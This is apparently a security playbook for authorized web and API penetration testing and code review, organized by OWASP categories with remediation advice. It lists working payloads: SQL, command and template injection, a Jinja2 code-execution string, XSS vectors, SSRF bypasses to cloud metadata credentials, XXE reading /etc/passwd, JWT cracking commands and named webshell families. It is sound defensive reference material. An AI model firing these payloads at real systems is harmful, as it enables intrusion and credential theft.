# Web & API Application Security Playbook

Authorized offensive testing and secure-code review for web apps and APIs. Whitehat framing throughout: every finding ships with remediation, a reproducible PoC is the *minimum* viable demonstration (never a weaponized kit), and active testing requires written authorization and in-scope confirmation. Distilled from `owasp-audit`, `api-audit`, `web-pentest`, `09-web-security`, `api-security-testing`, `insecure-defaults`, `security-payloads`, `security-webshells`.

## When this applies

Route an engagement here when the target presents any of:

- A web application (server-rendered, SPA, or hybrid) reachable over HTTP(S).
- An API surface — REST routes, GraphQL endpoint, tRPC/gRPC, Server Actions, webhook handlers, internal RPC.
- A source tree to audit against OWASP Top 10 (2021) / OWASP API Security Top 10 (2023).
- Signals: login/session flows, multi-tenant SaaS, object-ID-bearing URLs (`/users/:id`), file upload, URL-fetch features (webhooks/import/PDF-render/OG-scrape), `swagger.json` / `/graphql` / `/api/`, framework RPC surfaces (`'use server'`, Remix `action`/`loader`).
- Config/IaC review for fail-open insecure defaults (env-var fallbacks, hardcoded secrets, permissive CORS, debug mode).

Two modes coexist: **source review** (grep + read, no live target) and **live pentest** (black/grey-box against an authorized host). Use both where access allows — they catch different bugs.

## Methodology

### Phase 0 — Authorization & scope (live testing only)
1. Confirm written authorization for **this specific** app/domain; confirm it is live and in-scope (not deprecated/maintenance-frozen).
2. Pin out-of-scope items: production user data, payment flows, social engineering, DoS (require a named maintenance window for availability tests).
3. Rate-limit your own traffic — Burp Intruder at 100 req/s for hours is indistinguishable from DoS. If you find someone else's webshell or active exfil, STOP and notify the user.

### Phase 1 — Map the surface
4. **Source mode:** identify language/framework/architecture. Map entry points (routes, API handlers, form processors, framework RPC surfaces that don't appear as routes). Trace data flows (input → processing → storage → output). Locate auth/authz boundaries and the tenancy model (single/multi-tenant, row-level isolation).
5. **Live mode:** pull headers (`curl -I`), fingerprint stack (`Server`, `X-Powered-By`), enumerate paths (`/admin`, `/actuator/`, `/swagger`, `/graphql`, `/.git/`, `/.env`, `robots.txt`, `sitemap.xml`). Discover API endpoints from JS bundles and `swagger.json`/`openapi.json`. Test host-header behavior (`Host: internal.target.com`).
6. **Inventory every API surface explicitly** and reconcile against the published OpenAPI/typed-client contract — orphan/undocumented endpoints and stale `/v1/` versions are audit signals (API9).

### Phase 2 — Test (highest-yield first)
7. **Authorization** is the top-yield phase. Hunt BOLA/IDOR (horizontal), BFLA (vertical), and tenant-isolation breaks. This is the #1 API vuln by exploitation frequency.
8. **Authentication & session** — login, MFA, session token entropy/flags, fixation, logout invalidation, password reset, OAuth/PKCE/`state`/`redirect_uri`.
9. **Injection** — SQLi/NoSQLi/command/SSTI/XSS/SSRF at every input (params, path segments, headers, JSON/XML bodies, GraphQL vars, upload names).
10. **Business logic** — race conditions, negative numbers, out-of-order workflows, quota bypass, approval tampering. Scanners cannot reach this; reason about *what the app is supposed to do, done wrong*.
11. **Config/misconfig** — security headers, CORS, debug/introspection, error verbosity, insecure defaults, exposed admin engines.

### Phase 3 — Verify (do not stop at compile)
12. Every finding reduces to a single `curl`/request. For source fixes, **exercise the code path** — `tsc --noEmit` + build success ≠ fix verified. Modern frameworks have runtime-only failure modes (Edge/Node split runtimes, lazy module loads, env-var fallthrough).
13. Concrete verification per class:
    - BOLA: authenticate as user A, request user B's resource → expect 404, not 200.
    - Mass assignment: send the extra privileged field → confirm ignored/rejected.
    - Rate limit: hit at 10× configured rate → expect 429.
    - CORS: send `Origin: https://evil.com` → confirm browser blocks (server shouldn't reflect).
    - XSS/sanitizer: run the canonical payload set through the live policy; confirm each is neutralized.
14. **Second-opinion pass** (`owasp-audit`): re-audit with adversarial framing ("assume the author is overconfident; find what they missed"), ideally a different model/agent to break correlated blind spots. Treat disagreement as the higher-value finding. Always re-scan for new attack surface introduced *by the fix itself*.

## High-signal checklist

### A01 / API1 / API5 — Broken Access Control (the crown jewel)
- **BOLA/IDOR:** every route taking an object ID needs `findFirst({ where: { id, userId } })` *before* any data access — not `findById(id)` then a separate check. UUIDs are not access control; they only slow enumeration.
- **ORM relation traversal leaks tenants:** `posts.find(id).user.creditCard` returns another tenant's card if the relation isn't guarded. Audit every `.include` / `.with` / `includes` / eager-load — confirm the join target is filtered by the same tenant predicate as the parent (`owasp-audit`, `api-audit`).
- **IDOR via FK in mutation payloads:** form posts `categoryId`/`projectId`/`teamId`/`organizationId` → server validates the primary record but blindly trusts the FK → relation join surfaces another tenant's data. Look for `formData.get("<id>")` / `body.<id>` straight into insert/update without a preceding ownership query (`owasp-audit`).
- **Auth-check ordering / status enumeration:** returning 404 for "not found", 400 for "wrong state", 401 for "not authed" leaks state to an unauthenticated enumerator. Recommended response shape: uniform 404 for everything an unprivileged caller shouldn't see (`owasp-audit`).
- **Framework RPC surfaces that don't appear as routes** — enumerate and auth-check each: Next.js exported fns in `'use server'` files; Remix/React-Router `action`/`loader`; tRPC procedures; GraphQL resolvers; Rails non-resource controller actions (`owasp-audit`).
- **BFLA / vertical:** admin routes (from `/admin/*`, JS-bundle strings, Burp site map) must 403 for regular users. **Verb tampering:** `DELETE /admin/users/x` blocked but `POST /admin/users/x/delete` works. Try `X-HTTP-Method-Override: DELETE` / `X-Method-Override: PUT` (`api-security-testing`).
- **Sister-route audit:** when one handler has a state/ownership guard, grep every other handler writing the same table — the `POST /:id/send` shipped after the `PUT` was hardened often lacks it:
  ```bash
  rg 'update\(\s*tableName\b|\.update\(tableName' --type ts -B1 -A8
  ```
- **Open redirect** via `?from=`/`?next=`/`?returnTo=`/`?continue=`/`?redirect=`: normalize with `new URL(target, "http://localhost").pathname`, reject any byte in `[\x00-\x1F\x7F]`, backslashes, and percent-encoded slashes (`%2f`, `%5c`) — URL parsers collapse `/\tevil` into protocol-relative `//evil` (`owasp-audit`). **CWE-639**, CWE-601.
- **CSRF:** state-changing requests need synchronizer token / `SameSite` / custom header. Test by forging from a different origin.
- Grep: `params.id`, `req.params.<id>`, `formData.get("<id>")`, `.findById(`/`.find(` without `where`, `redirect(.*from`, `redirect(.*next`.

### A03 / injection — SQLi, NoSQLi, command, SSTI, XSS
- **SQLi detection ladder** (`09-web-security`): `'` → error; `' OR '1'='1'--` true / `' OR '1'='2'--` false; then time-based blind:
  - MySQL: `' AND SLEEP(5)-- -`
  - MSSQL: `'; WAITFOR DELAY '0:0:5'-- -`
  - PostgreSQL: `'; SELECT pg_sleep(5)-- -`
  - Error-based (MySQL): `' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -`
  - UNION enum: `' ORDER BY 1-- -` (increment to find column count), then `' UNION SELECT null,username,password,null FROM users-- -`
  - Modern stacks parameterize — hunt the one endpoint that didn't get the memo.
- **NoSQL injection (MongoDB):** `{"username":{"$ne":null},"password":{"$ne":null}}` or `{"username":"admin","password":{"$regex":".*"}}` for auth bypass (`api-security-testing`).
- **Command injection separators** (`09-web-security`): Linux `; id` `| id` `& id` `&& id` `` `id` `` `$(id)` `%0aid`; Windows `& whoami` `| whoami`; blind `; sleep 5`; OOB `; nslookup YOUR-COLLABORATOR-DOMAIN` (Burp Collaborator / interactsh).
- **SSTI probes:** `{{7*7}}`→49 (Jinja2/Twig/Freemarker), `${7*7}` (FreeMarker/Velocity/Mako), `<%= 7*7 %>` (ERB), `#{7*7}` (Pug). Jinja2 RCE: `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` (`09-web-security`).
- **XSS by context** (`09-web-security`): HTML content `<script>alert(1)</script>`; attribute `" onmouseover="alert(1)`; JS string `";alert(1);//`; URL `javascript:alert(1)`. Filter bypasses: `<ScRiPt>` (case), `<img src=x onerror=alert\`1\`>` (no parens), `<svg onload=alert(1)>` (no script tag).
- **Canonical XSS verification set** — run each through the configured sanitizer and confirm neutralized (`owasp-audit`):
  ```
  <img src=x onerror=alert(1)>
  <a href="javascript:alert(1)">x</a>
  <a href="data:text/html,<svg onload=alert(1)>">x</a>
  <img srcset="javascript:alert(1) 1x,https://ok.com/a.png 2x">
  <svg><script>alert(1)</script></svg>
  <math><mtext></style><img src=x onerror=alert(1)></math>
  <a href="//evil.com">protocol-relative</a>
  <svg></svg><img/onerror=alert(1) src=x>
  ```
- **Inline-script breakout via `JSON.stringify`:** `<script type="application/ld+json">` and `window.__DATA__ = JSON.stringify(...)` do NOT escape `<>&` / U+2028 / U+2029 — a stored title `</script><script>alert(1)</script>` breaks out. Grep `application/ld+json`, `__html: JSON.stringify`, `window.__` + `JSON.stringify`. Fix: escape `<>&  ` to `\uXXXX` (`owasp-audit`).
- **Rails ERB sinks:** `raw()`, `.html_safe`, `<%==`, permissive `sanitize` allowlist, `simple_format` on user input — grep alongside `dangerouslySetInnerHTML` / `v-html`.
- **Sanitizer choice:** require a vetted parser-based sanitizer (DOMPurify / isomorphic-dompurify / sanitize-html / bleach). Reject regex sanitizers; if unavoidable, treat `[/\s]` (not just `\s`) as attribute-name separator (`<img/onerror=…>`), strip both SVG- and HTML-namespace dangerous elements, and pair with `Content-Security-Policy: script-src-attr 'none'`. **Sanitize on write AND on render**; on a stored-XSS bug, plan a backfill migration for poisoned rows (`owasp-audit`).
- **SVG uploads = stored XSS:** SVG carries `<script>`/`onload`. Reject `image/svg+xml` unless sanitized + served `Content-Disposition: attachment`.
- Grep: `exec(`, `eval(`, `innerHTML`, `dangerouslySetInnerHTML`, `$where`, `v-html`, raw SQL strings. **CWE-89, CWE-79, CWE-78, CWE-1336.**

### A10 / API7 — SSRF (the bypass matrix is the crown jewel)
User-controlled URLs into server-side fetch (webhook, image-fetch, SSO callback, PDF render, OG-scrape, link unfurl). A real allow-list must reject **all** of these (`owasp-audit`):
- Wrong scheme `http://allowed.com/` when only `https:` expected; embedded creds `https://user:pass@allowed.com/`; `@`-host trick `https://allowed.com@evil.com/`; non-default port `:8443`.
- Punycode/IDN spoof `https://аllowed.com/` (Cyrillic) / `xn--llowed-pdc.com`; trailing dot `https://allowed.com./`; subdomain confusion `https://allowed.com.evil.com/`.
- Bracketed IPv6 `https://[::1]/`; bare IPv4 `127.0.0.1`; decimal `http://2130706433/`; hex `http://0x7f000001/`; octal `http://0177.0.0.1/` (and zero-padded `0010.0.0.1` → 8.0.0.1!); IPv4-mapped IPv6 `[::ffff:127.0.0.1]` — block the whole `::ffff:*` range.
- **Cloud metadata:** AWS `169.254.169.254`, GCP `metadata.google.internal`, ECS `169.254.170.2`, Azure IMDS; trailing-dot `metadata.google.internal.`. AWS path: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Require IMDSv2/hop-limit defenses.
- CGNAT `100.64.0.0–100.127.255.255`; link-local IPv6 `fe80::/10`; unique-local `fc00::/7`.
- **Fetch-time guards:** `redirect: "error"` (`redirect:"follow"` default lets a 302 bounce into IMDS), explicit timeout, no 3xx into metadata. Note the **DNS-rebinding TOCTOU** between validation and fetch — pin the resolved IP and connect by IP with a `Host:` header for high-risk callers.
- **Image-optimizer-as-proxy** (Next/Nuxt/SvelteKit): `images.remotePatterns: [{ hostname: '**' }]` or `domains: ['*']` routes arbitrary URLs through your CPU/bandwidth. Grep `remotePatterns`, `domains:`. **CWE-918.**
- Grep: `fetch(`, `axios(`, `http.get(`, `requests.get(`, `urllib` with user input.

### A02 / API2 — Crypto & Authentication failures
- **JWT attacks** (`api-security-testing`, `09-web-security`): `alg:none` accepted; algorithm confusion RS256→HS256 (`jwt_tool TOKEN -X k -pk public.pem`); `kid` injection; weak secret brute (`jwt_tool TOKEN -C -d rockyou.txt`); `jwt.decode` without `verify`.
- **Type coercion in verification paths:** `parseInt`/`Number`/`parseFloat` yields `NaN`, and `NaN > tolerance` is `false` — a timestamp-freshness check `if (Math.abs(now-parsed) > tol) return false` fails to reject `NaN`. Follow every numeric extraction in verify/token code with `if (!Number.isFinite(parsed)) return false` (`owasp-audit`). Also `parseInt('0x123',10)===0`, `parseInt('1e10',10)===1`.
- **Non-constant-time compare:** `submitted === expected` for passwords/keys/signatures leaks via timing. Use `crypto.timingSafeEqual` (Node) / `crypto.subtle.verify` (Web Crypto).
- **Credential-as-cookie** (CWE-522): `cookies.set("admin_token", process.env.ADMIN_PASSWORD)` equality-checked on read is plaintext-credential storage even with `httpOnly`/`secure` — replace with HMAC-signed expiring token.
- **Bearer-token compare with unset env:** `` `Bearer ${process.env.WEBHOOK_TOKEN}` `` resolves to literal `"Bearer undefined"` when unset — assert presence at module load.
- Weak hashing (MD5/SHA1 for passwords → bcrypt/Argon2/scrypt); bcrypt cost ≥ 12 (OWASP 2024). Sensitive data in logs/URLs/localStorage. API keys in URL query string (logged in CDN/proxy/access logs).
- **NextAuth v5 / Auth.js footguns:** `AUTH_SECRET` unset derives a weak dev value; Credentials `authorize()` has no built-in rate limit; account-enumeration via signup errors; JWT-strategy + adapter makes the adapter a near no-op so revocation must be designed in.
- **Rails/Devise:** `config.password_length` is enforced only with `:validatable` in the `devise :...` line — grep `^\s*devise\s+:` and flag missing `:validatable`.
- **Session (live):** entropy ≥128 bits (collect 10+ tokens, check patterns); `HttpOnly`+`Secure`+`SameSite`; rotate on login (fixation); invalidate server-side on logout (replay the cookie) and on password change; reset-link host-header poisoning (`Host: evil.com`).
- **OAuth:** `state` validated (CSRF), `redirect_uri` strictly matched (not prefix), auth code single-use, PKCE for public clients, client secret not in JS source, scope not over-requestable.
- Grep: `jwt.verify`, `jsonwebtoken`, `Bearer ${process.env`, `=== .*PASSWORD`, `!== .*SECRET`, `cookies.set\(.*process\.env`.

### API3 / mass assignment & excessive data exposure
- API returns whole DB row instead of a DTO — `res.json(user)` leaks `password_hash`, `stripe_customer_id`, internal flags.
- **Mass assignment:** privileged fields accepted on update. Probe set (`09-web-security`, `api_security_tester.py`): `role`, `isAdmin`, `is_admin`, `admin`, `permission(s)`, `scope`, `verified`, `active`, `status`. Example: `{"username":"hacker","email":"x","role":"admin","is_admin":true}`.
- Grep: `res.json(<entity>)` without projection, `Object.assign(record, req.body)`, `findByIdAndUpdate(id, req.body)`, `.update().set(req.body)`, `update(req.body)`. **CWE-915.**
- GraphQL: field-level auth missing — resolver checks "is query allowed" not "is this field allowed for this user".

### API4 — Unrestricted resource consumption
- No rate limit on login/signup/password-reset/SMS/email-verify; unbounded page size (`?limit=10000000`); GraphQL depth (`user{posts{user{posts...}}}`) and complexity uncapped; batching abuse (1000 queries / HTTP request); alias abuse (`a: users{id} b: users{id} ...`).
- **Rate-limit key fallback trap:** never fall back to a shared constant (`'unknown'`/`'anon'`) when the IP/user-id is missing — one attacker pins the bucket and locks out everyone behind a proxy. Fall back to a per-resource id (per-email signup, per-Stripe-customer billing) or refuse (`owasp-audit`).
- **Rate-limit bypass (live):** rotate `X-Forwarded-For` / `X-Real-IP` / `X-Originating-IP`, vary User-Agent, append junk params, case-flip the path (`api-security-testing`).

### A04 / A08 — Insecure design, races, integrity
- **Background/fire-and-forget jobs** lose request-scoped guards — re-check authz inside the worker. Grep `Promise.all(...).catch(`, `void someAsync(`, `.catch(noop)`, `enqueue(` without re-auth.
- **Atomic claim for worker/cron state transitions:** `SELECT`+`process()`+`UPDATE` is a race. Use `UPDATE … SET status='processing' WHERE id=? AND status='pending' RETURNING …` (Postgres) or `SELECT … FOR UPDATE SKIP LOCKED` (`owasp-audit`).
- **External-resource-create TOCTOU with billing:** "SELECT-check → `provider.create()` → INSERT" creates orphan billable resources (Stripe/Auth0/SendGrid/S3) under concurrency. Claim-first with `INSERT … ON CONFLICT DO NOTHING`, then provider call, then guarded `UPDATE … WHERE externalId IS NULL`, best-effort cleanup on race-loss.
- **External side-effects before durable DB state:** do the DB commit before the charge/email/webhook. "External done, DB stale" is unrecoverable; reserve-then-act with a conditional UPDATE guarded by pre-action state makes it idempotent.
- **Multi-tenant webhook signature matching:** trying each tenant's secret in turn = O(N) HMAC+DB per request → CPU/DB flood. Defenses: signature-shape prefilter (`/^[a-f0-9]{64}$/i`) before DB work; hard cap `LIMIT 200`; per-IP rate limit; embed tenant id in the webhook URL for O(1) lookup (`owasp-audit`).
- **Business logic (live):** race a coupon code 100× concurrently (double-redeem); negative-number transfer (`-100` credits you); out-of-order workflow (step 4 before step 2); quota enforced server-side or just UI; approve-your-own-request via `approver_id` tamper.

### A05 / API8 — Misconfiguration & insecure defaults
- **Baseline security headers** (`owasp-audit`, paste-and-tune):
  | Header | Value |
  |---|---|
  | `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` (preload is sticky — verify first) |
  | `X-Content-Type-Options` | `nosniff` |
  | `X-Frame-Options` | `DENY` |
  | `Referrer-Policy` | `strict-origin-when-cross-origin` |
  | `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), browsing-topics=()` |
  | `Content-Security-Policy` | start `frame-ancestors 'self'`; full CSP needs per-site script audit |
- **CORS:** `Access-Control-Allow-Origin: *` + `Allow-Credentials: true` is invalid and dangerous; reflecting `Origin` without an allow-list allows any origin. Test: `Origin: https://evil.com`, `Origin: null`, `Origin: https://evil.target.com` (`api-security-testing`).
- **Fail-open insecure defaults (the `insecure-defaults` crown jewel)** — fail-open = CRITICAL, fail-secure = SAFE:
  - Fallback secret `SECRET = env.get('KEY') or 'default'` / `process.env.X || 'admin123'` / `ENV.fetch('SECRET_KEY_BASE','fallback')` → app runs with known secret, attacker forges tokens. **SAFE:** `os.environ['SECRET_KEY']` (crashes if missing).
  - Fail-open auth `REQUIRE_AUTH = getenv('REQUIRE_AUTH','false')`; CORS `ALLOWED_ORIGINS || '*'`; `DEBUG = getenv('DEBUG','true')`.
  - Default credentials: hardcoded `admin/admin123` bootstrap, `STRIPE_KEY || 'sk_test_...'`, DB connection-string fallback.
  - Grep: `getenv.*\) or ['"]`, `process\.env\.[A-Z_]+ \|\| ['"]`, `ENV\.fetch.*default:`, `password.*=.*['"][^'"]{8,}['"]`, `DEBUG.*=.*true`, `AUTH.*=.*false`, `CORS.*=.*\*`, `MD5|SHA1|DES|RC4|ECB` in security contexts. **Trace the path: does the app run with the default, or crash?** Skip test fixtures, `.example`/`.template`/`.sample`, dev-only tooling.
- **Hardcoded-secret sweep** — generic + provider prefixes (`owasp-audit`):
  ```bash
  git ls-files | xargs grep -lE 'sk_live|ghp_|AKIA[0-9A-Z]{16}|sk-ant-' 2>/dev/null
  ```
  Stripe `sk_live_`/`rk_live_`/`whsec_`; GitHub `ghp_`/`gho_`/`ghs_`; AWS `AKIA[0-9A-Z]{16}`/`ASIA…`; GCP `AIza[0-9A-Za-z\-_]{35}` + `"type": "service_account"`; Slack `xox[baprs]-`; OpenAI/Anthropic `sk-`/`sk-ant-`; Vercel `vercel_blob_rw_`. Include `*.yml`/`*.yaml`/`*.toml`/`*.json` (Rails `cable.yml`, K8s manifests) — a source-only sweep misses TLS/cert config.
- **Rails admin-engine mounts:** PgHero / Sidekiq::Web / Flipper / Mission Control README examples wrap auth in `if Rails.env.production?`, leaving staging/preview anonymous. Grep `mount .+::(Engine|Web|UI)` in `config/routes.rb`; switch guard to `unless Rails.env.local?` + fail-closed when auth env vars unset.
- **Configured-but-not-loaded:** verify the middleware package is actually installed, not just that the initializer exists (`if defined? Foo` silently no-ops). Rails: `bundle exec rails middleware | grep -i FOO`.
- **Source-tree hygiene** — sync-conflict duplicates retain the vuln after the canonical file is patched:
  ```bash
  find . \( -name '* 2.*' -o -name '*.orig' -o -name '*.bak' \) -not -path '*/node_modules/*'
  ```
- **Runtime-API mismatch:** `node:crypto`/`node:fs` imports in Next.js `middleware.ts` / Cloudflare Workers / Vercel Edge compile but throw at first request — prefer Web Crypto (`crypto.subtle`).
- Verbose errors leaking stack traces/SQL schema/file paths; validation libs echoing schema (`Zod err.issues`); GraphQL/OpenAPI introspection in prod (`{ __schema { types { name } } }`).
- **API routes should return `401 application/json`, not an HTML 302 to `/login`** — the redirect breaks `fetch` clients, hides auth state, and leaks endpoint existence via 302-vs-404.

### File upload / path traversal / webshells
- **Upload-as-stored-content:** can you upload `.html`/`.svg` and have it served with `Content-Type: text/html`/`image/svg+xml`? That's stored XSS / RCE depending on handler.
- **Malicious filename payloads** (`security-payloads`, SecLists curated): directory traversal filenames `..;`, `..\:;`, `.:..:`, `:..:;`; null-byte `Hello%00World.txt`, `Hello.php%00World.txt` (extension-filter bypass); command-exec filenames `` Hello`hostname`World.txt ``, `Hello$(hostname)World.txt` (shell-out on file processing); over-length names (255+) for buffer/error-based access-control bugs; EICAR test string for AV-pipeline validation.
- **Webshell families for detection/post-upload validation** (`security-webshells`, SecLists — authorized testing/detection only): PHP (`cmd.php`, `cmd-simple.php`, obfuscated/Dysco), ASPX (`cmd.aspx`), JSP (`cmd.jsp`, `reverse.jsp`, `simple-shell.jsp`), CFM (`shell.cfm`), plus Laudanum, WordPress, Magento, Vtiger CMS-specific shells and `backdoor_list.txt`. Use to validate that upload filtering/AV/EDR catches a known shell — never to establish unauthorized persistence.

### HTTP request smuggling & web cache poisoning

**Request smuggling (CL.TE / TE.CL / H2.TE/CL)** — arises when a front-end and back-end parse the body boundary differently. The attacker poisons the back-end's read-position so the next legitimate request is processed as a continuation of the attacker's payload.

- **Detect:** send a CL.TE probe — `Transfer-Encoding: chunked` body with a `Content-Length` slightly shorter than the real body. A time delay (≥5s) when the back-end stalls on a partial chunk is evidence of desync. Use Burp's HTTP Request Smuggler extension to automate without manual timing.
- **TE.CL:** back-end uses `Content-Length`, front-end uses `Transfer-Encoding: chunked`. Send a chunk size that terminates early from the back-end's view.
- **H2.TE / H2.CL (HTTP/2 downgrade):** the front-end is HTTP/2, back-end is HTTP/1.1. The H2 `content-length` pseudo-header doesn't exist; any injected `content-length` header is forwarded and trusted by an HTTP/1.1 back-end. Test: include a `content-length` header in the H2 request body — Burp Pro detects this automatically.
- **Impact chain:** smuggle a prefix that poisons the next victim's request — read their `Cookie`/`Authorization` headers by routing them into a reflected endpoint, bypass front-end ACLs (a smuggled `GET /admin` gets back-end treatment without the front-end's access check), or capture credentials via a poisoned 302.
- **Grep signal:** multi-layer reverse-proxy stacks (nginx→Apache, CDN→ALB), `Transfer-Encoding` handling in custom middleware.
- **CWE-444.** Fix: enforce strict HTTP/1.1 parsing (reject ambiguous messages); prefer HTTP/2 end-to-end; or normalize at the edge (reject requests with both `Content-Length` and `Transfer-Encoding`).

**Web cache poisoning** — inject an unkeyed request component (header, parameter, method) so the cache stores and serves a poisoned response to all users of that cache key.

- **Unkeyed headers:** `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Original-URL`, `X-Rewrite-URL`, `X-HTTP-Method-Override`. If the app reflects any of these into the response (Location header, JS import, canonical link) and the cache doesn't include them in the cache key, every subsequent user gets the poisoned response.
  - Probe: add `X-Forwarded-Host: evil.com` — does the response reflect `evil.com`? Does the poisoned version get cached (re-request without the header)?
- **Unkeyed query parameters:** `utm_*` / `fbclid` / `gclid` parameters often stripped from the cache key but may be reflected in the response (open redirect or DOM-clobbering). Use `?evil="><script>alert(1)</script>&utm_source=test` against endpoints with stripped UTM params.
- **Cache key override / normalization tricks:** `?foo=bar` and `?foo=bar%20` may map to the same cache key but different application behavior. URL-encode characters to probe key normalization.
- **Fat GET / method override:** some caches key on method only; sending `GET /` with a body (fat GET) or `X-HTTP-Method-Override: POST` may execute a state-changing operation cached under a GET key.
- **DOM-based cache poisoning:** the poisoned header value lands in a JS variable (e.g. `var hostName = "evil.com"`) that's served to all users from cache.
- **CWE-345.** Fix: include sensitive reflected headers in the cache key (`Vary: X-Forwarded-Host`); strip unrecognized headers at the CDN before forwarding; never reflect unvalidated request headers into cacheable responses.

Grep: `req.headers['x-forwarded-host']`, `request.getHeader("X-Forwarded-Host")`, `Host:` overrides in config; cache config for `Vary` and `ignore_headers`.

### GraphQL & REST specifics
- GraphQL: introspection in prod, field-level authz gaps, depth/complexity caps, batching/alias DoS, error messages revealing internal field paths.
- REST: HTTP verb not enforced (GET on state-changing endpoint → CSRF + cache poisoning); Content-Type confusion (JSON handler accepting `x-www-form-urlencoded` and parsing inconsistently); path traversal in resource IDs (`/files/../../etc/passwd`); XXE in XML/SOAP/SVG-upload (`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`).
- Webhook handlers: signature missing/bypassable (type-coercion, N-way matching), replay (no timestamp tolerance/nonce), predictable path without IP allow-list/signature.

## Tools & commands
- **Burp Suite** (Community proxy/repeater/intruder/decoder; Pro scanner + session rules; extensions Autorize / AuthMatrix / JWT4B for authz matrices).
- **OWASP ZAP** — `zap-cli quick-scan`, `zap-cli spider`, `zap-cli active-scan`.
- **Fuzzers/discovery** — `ffuf -u https://target/FUZZ -w wordlist.txt -mc 200,301,302,403`; `feroxbuster`, `gobuster`; `arjun -u URL` (param discovery); `kr scan` (Kiterunner API routes).
- **sqlmap** — start conservative `--risk=1 --level=1` (noisy/destructive otherwise).
- **dalfox / XSStrike** — XSS (high false-positive; starting point only).
- **nuclei** — `nuclei -u URL -t ~/nuclei-templates/api/`; the templates are excellent reading.
- **jwt_tool** — `-d` decode, `-X a` alg:none, `-X k -pk public.pem` RS256→HS256 confusion, `-C -d wordlist` secret brute.
- **TLS** — `testssl.sh https://target` or `sslyze --regular target`.
- **RESTler** (Microsoft) — `python3 restler.py --api_spec swagger.json` stateful REST fuzzing.
- **curl / httpie** — every finding should reduce to a repeatable curl. `curl -I -H "Origin: https://evil.com"` for CORS; `curl -X POST … -H "X-HTTP-Method-Override: DELETE"` for verb tampering.
- **Bundled scripts** (`09-web-security`): `owasp_scanner.py --url URL --tests a01,a02,a05`; `api_security_tester.py --base-url URL --spec openapi.yaml --token T` (BOLA/mass-assignment/rate-limit/headers).
- **Source-review tooling** — `rg`/`grep` with the patterns above; `npm audit --omit=dev`, `pip audit` for A06 (triage by reachability: runtime-reachable = fix, build/dev-only = defer).

## Expert gotchas / bypasses
- **Status-code enumeration is itself a leak.** Differential 404/400/401 lets an attacker map resource existence and state without ever passing the auth gate. Uniform 404 for everything an unprivileged caller shouldn't see (`owasp-audit`).
- **`NaN` defeats inequality gates.** `parseInt(garbage)` → `NaN`, and `NaN > tolerance` is `false`, so freshness/expiry checks silently pass. Always `Number.isFinite` before comparing in verify code.
- **Octal IP `0010.0.0.1` is 8.0.0.1, not 10.x** — zero-padding flips the parse; SSRF allow-lists that string-compare miss it. So do trailing-dot hostnames (`localhost.`, `metadata.google.internal.`) which are DNS-equivalent.
- **`redirect:"follow"` is the SSRF amplifier** — a validated allowed host can 302 you straight into `169.254.169.254`. Set `redirect:"error"` and pin the resolved IP (DNS-rebinding TOCTOU between validate and fetch).
- **`JSON.stringify` is not HTML-safe.** Inline `<script>` data blocks break out on `</script>` and U+2028/U+2029 even though the data "is just an object."
- **Library-doc fixes may be correct and still not run.** Enabling Better Auth `rateLimit` doesn't help if you call `auth.api.signInEmail(...)` programmatically (bypasses the HTTP router the limiter attaches to). Trace from call site to the affected code path before declaring "fixed" (`owasp-audit`).
- **Sister routes ship the bug.** The hardened `PUT /:id` and the forgotten `POST /:id/send` write the same table — one got the guard, one didn't. Always grep every writer of a table.
- **Fail-open vs fail-secure is the whole game for defaults.** `env.get('KEY') or 'x'` runs insecure; `env['KEY']` crashes safe. When in doubt, trace whether the app boots with the default.
- **404 ≠ "doesn't exist" in the BOLA verifier.** A 200 on user B's resource while authed as A is the bug; a 404 is only "good" if *your own* 404 looks identical to the unauthorized one.
- **Mass-assignment false positive:** a privileged field reflected in the response isn't proof it was *persisted* — re-fetch as the victim/admin to confirm the write took, not just the echo.
- **CORS `*` without credentials is often fine; `*` + reflected Origin + `Allow-Credentials: true` is the exploitable combo.** Don't over-report a wildcard on a public, credential-free endpoint.
- **`tsc --noEmit` + green build is not verification.** Edge/Node runtime split, lazy `import()` adapters, and env-var fallthrough (`Bearer ${undefined}`) all compile clean and fail at first request. Exercise the route.
- **Second pass with a different agent.** A single-pass audit reliably finds checklist categories but misses the off-checklist bypasses (`localhost.`, IPv4-mapped IPv6, ordered 404/400/401, callback control chars). Treat the disagreeing finding as the high-value one.
- **HackTricks/community payloads vary in quality** — verify technique specifics against fresh sources before relying on them in a report.

## Delegate to
- **owasp-audit** — full OWASP Top 10 (2021) source-code review with per-category Findings/Clean/N-A report, second-opinion pass, and the deep SSRF/XSS/race-condition bypass detail. Use when reviewing a codebase end-to-end.
- **api-audit** — surface-driven pass over every endpoint against OWASP API Security Top 10 (2023): BOLA/BFLA/BOPLA, mass assignment, GraphQL/webhook specifics. Use when the API contract is the unit of work.
- **web-pentest** — live black/grey-box WSTG methodology, Burp/ZAP workflows, session/auth/business-logic testing against an authorized host. Use when you have a live target + credentials.
- **09-web-security** (`Web Application Security Testing`) — concrete payload libraries (SQLi/XSS/SSTI/cmd-injection), JWT/OAuth/CORS test recipes, and the `owasp_scanner.py` / `api_security_tester.py` scripts. Use for ready-to-fire probes and CVSS-tagged reporting.
- **api-security-testing** (`testing-apis`) — exhaustive curl-driven REST/GraphQL recipes: method-override, NoSQL/XXE, GraphQL introspection/batching, rate-limit bypass, Swagger analysis. Use for hands-on API request crafting.
- **insecure-defaults** — fail-open detection with the verify-the-code-path workflow and the vulnerable/secure example bank. Use for config/IaC/env-handling review.
- **security-payloads** — SecLists curated file-name attack payloads (traversal, null-byte, command-exec filenames, EICAR, max-length). Use when testing upload filters and AV/path-traversal controls.
- **security-webshells** — SecLists webshell corpus (PHP/ASPX/JSP/CFM + CMS-specific) for detection-system / upload-filter validation. Use to confirm controls catch known shells (authorized detection only).

## Cross-references
- **Cloud & container security** — SSRF → IMDS pivots into AWS/GCP/Azure credential theft; container/K8s misconfig; S3 public-by-default.
- **Crypto / TLS** — JWT alg confusion, KDF/bcrypt cost, IV/nonce, cipher suites, constant-time comparison.
- **Recon / OSINT** — subdomain/endpoint enumeration and JS-bundle secret discovery feed Phase 1 surface mapping.
- **Dependency / supply chain** — A06 vulnerable components, CVE triage by reachability.
